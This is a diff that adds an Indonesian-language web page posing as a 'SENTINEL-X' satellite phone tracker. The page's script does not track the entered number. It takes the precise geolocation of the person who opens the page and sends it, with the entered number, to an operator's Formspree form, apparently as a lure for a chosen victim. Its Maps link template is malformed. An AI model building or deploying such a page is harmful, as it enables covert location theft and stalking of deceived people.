@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SENTINEL-X | GPS TRACKER</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .terminal { border: 1px solid #0f0; padding: 30px; width: 320px; text-align: center; box-shadow: 0 0 25px #0f0; background: #050505; border-radius: 8px; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 85%; margin-bottom: 20px; outline: none; font-size: 16px; }
+        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
+        #status { font-size: 11px; margin-top: 20px; color: #888; text-align: left; min-height: 50px; border-top: 1px solid #222; padding-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="terminal">
+        <h2 style="letter-spacing: 5px;">SENTINEL-X</h2>
+        <p style="font-size: 10px;">[ SATELLITE LINK ACTIVE ]</p>
+        <hr color="#004400">
+        <p>MASUKKAN NOMOR TARGET:</p>
+        
+        <input type="text" id="phone" placeholder="08XXXXXXXXXX" required>
+        <button type="button" onclick="lacakSekarang()">INITIATE TRACKING</button>
+        
+        <div id="status">> Sistem Ready...</div>
+    </div>
+
+    <script>
+        async function lacakSekarang() {
+            const phone = document.getElementById('phone').value;
+            const status = document.getElementById('status');
+            
+            // GANTI LINK DI BAWAH DENGAN LINK DARI FORMSPREE KAMU
+            const FORMSPREE_URL = "https://formspree.io";
+
+            if (!phone) { alert("Nomor HP wajib diisi!"); return; }
+
+            status.innerText = "> MENGHUBUNGKAN KE SATELIT GPS...";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapsUrl = `https://www.google.com{lat},${lon}`;
+                    
+                    status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM DATA...";
+
+                    try {
+                        const response = await fetch(FORMSPREE_URL, {
+                            method: 'POST',
+                            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                Nomor_HP: phone,
+                                Lokasi_Maps: mapsUrl,
+                                Akurasi: position.coords.accuracy + " meter"
+                            })
+                        });
+
+                        if (response.ok) {
+                            status.innerText = "> DATA BERHASIL TERKIRIM KE DASHBOARD.";
+                            alert("Pelacakan Berhasil! Data lokasi akurat sudah dikirim ke email kamu.");
+                        } else {
+                            status.innerText = "> GAGAL: SERVER MENOLAK DATA.";
+                        }
+                    } catch (error) {
+                        status.innerText = "> ERROR: GAGAL TERHUBUNG KE SERVER.";
+                    }
+                    
+                }, (error) => {
+                    alert("Gagal: Target menolak izin lokasi. Pastikan klik 'Izinkan/Allow'.");
+                    status.innerText = "> AKSES LOKASI DITOLAK OLEH TARGET.";
+                }, { enableHighAccuracy: true });
+            } else {
+                alert("Browser tidak mendukung GPS.");
+            }
+        }
+    </script>
+</body>
+  </html>
+  
